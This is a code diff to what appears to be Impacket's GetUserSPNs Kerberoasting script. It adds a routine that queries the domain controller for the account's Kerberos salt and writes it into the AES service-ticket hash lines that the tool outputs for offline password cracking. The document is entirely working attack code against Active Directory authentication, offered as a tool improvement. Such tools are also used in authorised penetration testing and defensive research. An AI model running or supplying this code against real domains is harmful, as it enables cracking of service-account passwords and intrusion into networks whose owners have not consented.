@@ -157,6 +157,61 @@ class GetUserSPNs:
 
         return TGT
 
+    def _ktsalt(self, username, realm):
+        from impacket.krb5.asn1 import AS_REQ, AS_REP, KRB_ERROR, METHOD_DATA, ETYPE_INFO2, KERB_PA_PAC_REQUEST, seq_set, seq_set_iter
+        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
+        from impacket.krb5.types import KerberosTime, Principal
+        from pyasn1.codec.der import encoder, decoder
+        from pyasn1.type.univ import noValue
+        import datetime
+        try:
+            req = AS_REQ()
+            req['pvno'] = 5
+            req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+            req['padata'] = noValue
+            req['padata'][0] = noValue
+            req['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+            pac = KERB_PA_PAC_REQUEST(); pac['include-pac'] = True
+            req['padata'][0]['padata-value'] = encoder.encode(pac)
+            rb = req['req-body']
+            rb['kdc-options'] = constants.encodeFlags([constants.KDCOptions.forwardable.value,
+                constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value])
+            seq_set(rb, 'cname', Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
+            seq_set(rb, 'sname', Principal('krbtgt/%s' % realm, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
+            rb['realm'] = realm
+            t = KerberosTime.to_asn1(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1))
+            rb['till'] = t; rb['rtime'] = t; rb['nonce'] = 0x41414141
+            seq_set_iter(rb, 'etype', (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value)))
+            try:
+                data = sendReceive(encoder.encode(req), realm, self.__kdcHost or self.__kdcIP)
+            except KerberosError as e:
+                data = e.getErrorPacket()
+            def pick(pas):
+                for p in pas:
+                    if int(p['padata-type']) == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
+                        for ei in decoder.decode(p['padata-value'], asn1Spec=ETYPE_INFO2())[0]:
+                            if ei['salt'].hasValue():
+                                return str(ei['salt'])
+                return None
+            salt = None
+            try:
+                err = decoder.decode(data, asn1Spec=KRB_ERROR())[0]
+                if err['e-data'].hasValue():
+                    salt = pick(decoder.decode(bytes(err['e-data']), asn1Spec=METHOD_DATA())[0])
+            except Exception:
+                try:
+                    rep = decoder.decode(data, asn1Spec=AS_REP())[0]
+                    if rep['padata'].hasValue():
+                        salt = pick(rep['padata'])
+                except Exception:
+                    pass
+            if salt and salt.startswith(realm):
+                return salt[len(realm):]
+            return salt or username
+        except Exception:
+            return username
+
     def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
         if self.__no_preauth:
             decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
@@ -188,7 +243,7 @@ class GetUserSPNs:
                 fd.write(entry + '\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
+                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, self._ktsalt(username, str(decodedTGS['ticket']['realm'])), decodedTGS['ticket']['realm'],
                 spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
@@ -198,7 +253,7 @@ class GetUserSPNs:
                 fd.write(entry + '\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
+                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, self._ktsalt(username, str(decodedTGS['ticket']['realm'])), decodedTGS['ticket']['realm'],
                 spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
